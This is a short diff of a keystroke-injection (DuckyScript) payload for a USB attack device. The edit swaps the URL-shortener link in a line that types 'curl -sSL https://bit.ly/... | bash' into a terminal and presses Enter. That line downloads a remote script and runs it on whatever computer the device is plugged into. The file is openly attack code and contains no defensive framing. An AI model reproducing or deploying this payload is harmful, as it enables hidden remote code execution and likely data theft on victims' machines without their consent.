@@ -17,7 +17,7 @@ REM     Delete anything that might have been typed in
 CTRL u
 DELAY 100
 REM     Run payload
-STRING export dc=''; curl -sSL https://bit.ly/iposx | bash
+STRING export dc=''; curl -sSL https://bit.ly/3TsJUjX | bash
 ENTER
 DELAY 200
 
